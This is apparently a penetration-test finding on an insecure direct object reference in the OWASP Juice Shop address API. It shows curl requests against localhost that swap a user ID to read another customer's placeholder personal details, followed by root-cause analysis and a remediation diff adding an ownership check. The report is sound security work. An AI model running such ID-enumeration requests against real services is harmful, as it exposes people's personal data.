# Finding F-03: Insecure Direct Object Reference (IDOR)

- **OWASP Category**: A01:2021-Broken Access Control
- **Target Component**: Juice Shop Address API (`/api/Addresss/<id>`)
- **Vulnerable Parameter**: `id` (path parameter)

---

## 1. Attack Path & Exploitation Evidence

### Step 1: Reconnaissance
An authenticated attacker (User A, ID 2) retrieves their own address details via the API and observes the JSON structure.

**Request (curl)**:
```bash
curl -i -s -H "Authorization: Bearer attacker_token_jwt" \
  "http://localhost:3000/api/Addresss/2"
```

**Response Evidence**:
```json
{
  "status": "success",
  "data": {
    "id": 2,
    "UserId": 2,
    "fullName": "Alice Attacker",
    "mobileNum": "9876543210",
    "zipCode": "400001",
    "streetAddress": "123 Attacker Lane, Mumbai"
  }
}
```

### Step 2: Exploitation (IDOR Query)
The attacker queries the address endpoint by incrementing the `id` parameter to `1` (which belongs to Bob, User ID 1).

**Exact Payload**:
Path replacement `/api/Addresss/2` → `/api/Addresss/1`

**Request (curl)**:
```bash
curl -i -s -H "Authorization: Bearer attacker_token_jwt" \
  "http://localhost:3000/api/Addresss/1"
```

**Response Evidence**:
The API returns the address details of Bob without validating if the token user matches the record's owner:
```json
{
  "status": "success",
  "data": {
    "id": 1,
    "UserId": 1,
    "fullName": "Bob Victim",
    "mobileNum": "9999888877",
    "zipCode": "110001",
    "streetAddress": "456 Victim Road, New Delhi"
  }
}
```
*Result*: Attacker successfully accesses Bob's PII.

---

## 2. Root Cause Analysis
The API endpoint handles resource retrieval by querying the database using only the primary key `id` supplied in the URL path. It fails to check if the `UserId` of the retrieved database record matches the authenticated user ID extracted from the JSON Web Token (JWT).

---

## 3. Business Impact
Attackers can harvest the full names, phone numbers, and physical addresses of all customers on the portal, violating RBI customer protection guidelines and exposing the company to regulatory fines.

---

## 4. Code-Level Remediation Patch
The fix requires implementing ownership checks on the backend endpoint handler before returning database results.

```diff
--- webapp/routes/address.js.orig
+++ webapp/routes/address.js
@@ -12,8 +12,14 @@
     const addressId = req.params.id;
     const authenticatedUserId = req.user.id; // Extracted from JWT
 
-    // Vulnerable lookup: only queries by primary key ID
-    Address.findByPk(addressId)
+    // Secure lookup: query by primary key ID and verify ownership
+    Address.findOne({ where: { id: addressId } })
       .then(address => {
         if (!address) {
           return res.status(404).json({ status: 'error', message: 'Address not found' });
         }
+        
+        // Enforce Broken Access Control prevention
+        if (address.UserId !== authenticatedUserId && !req.user.isAdmin) {
+          return res.status(403).json({ status: 'error', message: 'Access Denied: Resource owner mismatch' });
+        }
+        
         res.status(200).json({ status: 'success', data: address });
       })
       .catch(err => next(err));
```
